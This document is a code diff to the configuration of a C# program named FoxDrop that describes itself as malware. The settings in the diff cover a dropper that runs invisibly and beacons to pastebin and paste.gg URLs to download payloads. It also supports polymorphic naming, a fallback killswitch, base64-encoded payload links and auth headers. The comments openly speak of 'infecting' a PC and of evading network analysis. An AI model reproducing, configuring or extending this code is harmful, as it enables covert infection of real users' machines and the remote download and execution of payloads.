@@ -17,7 +17,7 @@ namespace FoxDrop
             Console.WriteLine("[└] Polymorphic Seed: " + Hashing.CalculateFileMD5(Assembly.GetExecutingAssembly().Location));
 
             Console.WriteLine("\n[*] Performing Checks... ");
-            if(!IS_POLYMORPHISM_ENABLED)
+            if (!IS_POLYMORPHISM_ENABLED)
                 Console.WriteLine("· Polymorphism Disabled, Checking static name ... " + ((STATIC_NAME.Length >= 8) ? "OK." : "FAILED.\n└─ REASON: Static name needs to be at least 8 characters long."));
 
             Console.WriteLine("· Checking Delay ... " + ((BEACON_DELAY_MS > 5000) ? "OK." : "WARNING.\n└─ REASON: Delay may be too small. It is recommended to have it above 5 seconds."));
@@ -35,7 +35,7 @@ namespace FoxDrop
         public static bool TROUBLESHOOTING_CHECKS_ENABLED = false; // IMPORTANT: Disable it to start infecting.
 
         // Run the program with this mode ON to Console-Log all the malware operations on the PC (You will still be infected)
-        public static bool DEBUG_VIEW = false; // If enabled, the program will not be invisible and the terminal will appear.
+        public static bool DEBUG_VIEW = true; // If enabled, the program will not be invisible and the terminal will appear.
 
         // ##¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯## //
         // ###     Malware Logic Values     ### //
@@ -48,20 +48,24 @@ namespace FoxDrop
         public static string STATIC_NAME = "b1ec7d10"; // Incognito name, could be random or "SysAudioApp" type names.
 
         // Delay for every beacon request (Larger = Slower = Less Obvious in Network Analysis)
-        public static int BEACON_DELAY_MS = 300000; // Default: 15000 (15s)
+        public static int BEACON_DELAY_MS = 15000; // Default: 15000 (15s)
 
         // The URL including the payload(s) download link, delimited by new lines and *POSSIBLY* Base64 encoded.
-        public static string BEACON_DOWNLOAD_CONTAINER_URL = "https://pastebin.com/raw/b4SYNyAT";
+        public static string BEACON_DOWNLOAD_CONTAINER_URL = "https://pastebin.com/raw/Ux11SkZ4";
 
         // If the following string is not found on the first URL, the malware will use the fallback one instead.
         public static string BEACON_FALLBACK_KILLSWITCH_STRING = "a0ec32bd"; // Make sure to sync the URLs (1st and fallback)
 
         public static string BEACON_DOWNLOAD_CONTAINER_URL_FALLBACK = "https://paste.gg/p/test12d/a74c69eca9134181b7e4b6c7349a0ac5/files/254c551437794fdfbb08de2934d5754w/raw";
 
-        public static bool ARE_PAYLOAD_LINKS_BASE64 = true; // Determine if each payload link is individually encoded in Base64.
+        public static bool ARE_PAYLOAD_LINKS_BASE64 = false; // Determine if each payload link is individually encoded in Base64.
 
         // Very useful miscellaneous variable to check if malware was executed on system before.
         public static bool IS_FIRST_EXECUTION_ON_SYSTEM = true; // Assumes its 1st execution by default.
+
+        // Custom request headers when sending the GET request to the download container & for downloading payloads (possibly use for auth)
+        public static string[] BEACON_CONTAINER_REQUEST_AND_DOWNLOAD_HEADERS =
+            { "Example-Access-Code: 81102731" }; // Leave empty for no extra headers.
 
 
         // ##¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯## //
